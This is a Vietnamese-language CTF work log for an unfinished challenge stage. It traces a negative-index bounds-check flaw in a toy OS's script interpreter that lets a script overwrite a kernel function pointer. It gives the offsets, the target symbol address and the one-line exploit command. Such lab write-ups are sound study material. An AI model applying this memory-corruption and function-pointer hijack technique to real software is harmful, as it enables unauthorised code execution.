# notes.md - soupos-4-too-many-cooks (DANG MO)

Handout: `files/soupos-handout.tar.gz` (sha256 `c9fc07e2…92a1e7`) + `files/symbols.txt`
(`1e1aad7e…04b7d9`) — giong het stage 0/1/2/3.

## N1 - Cua nao co the ghi duoc trong kernel
cmd: `grep -n 'a->elems\[i\] = v' soupos/src/soupyc.c`; `sed -n '1150,1172p' soupos/src/soupyc.c`
evidence: `N_INDEX_SET` chi chan `if (i >= a->len)` o ban CHALLENGE; ban NO_CHALLENGE chan ca `i < 0`.
Comment trong source ghi thang vao ten: "a negative index writes below the pool... Stage 4"
result: OK - co mot phep ghi kernel tu script

## N2 - Muc tieu ghi nam dau
cmd: `grep -n -B8 -A6 'after_hook' soupos/src/soupyc.c`
evidence: struct `sc_state { guard(+0); after_hook(+4); pad[40](+8); pool(+48); }` ngay tren pool;
`if (sc_state.after_hook) sc_state.after_hook();` tai `soupyc.c:1575`
result: OK - con tro ham duoc goi khi script ket thuc

## N3 - Tinh lech
cmd: `python exploit.py`
evidence: `sizeof(val_t)=56`, `pool[0].elems@56`, nen `&elems[-1] = &sc_state + 0`:
`type` trung `guard`, `ival` trung `after_hook`
result: OK - chi so can dung la `-1` cho handle 0 (mang dau tien cua script)

## N4 - Dia chi ham
cmd: `grep serve_the_special files/symbols.txt`
evidence: `00100990 T serve_the_special` → `1051024` thap phan (soupyc khong co hang so hex)
result: OK - lenh: `soup -c let a=[1] a[-1]=1051024`

## N5 - Control o local (khong phai doan chut)
cmd: `gcc -O0 -w -idirafter ../soupos/src -o stage4.exe analysis/stage4_probe.c ../soupos/src/soupyc.c ../soupos/src/vfs.c stubs.c`
evidence: `let a=[1] a[-1]=<addr decoy>` in ra `DECOY-CALLED`; `a[-1]=0` khong in gi;
mot cau hinh ghi gia tri khong map thi SIGSEGV tai `soupyc_run+617` (dung choi hook)
result: OK - so nguyen trong script that su tro thanh con tro ham duoc goi

## N6 - Tai sao van de nguyen trong _wip
cmd: (chua chay tren may)
evidence: nguoi choi chua dan lai output cua `soup -c let a=[1] a[-1]=1051024`; phien bi gian doan
chuyen sang Cosmic Call
result: MO - chi can mot lenh go; neu thay `The kitchen is yours: cdctf{...}` thi day folder ra khoi
`_wip/` va ghi `flag.txt`
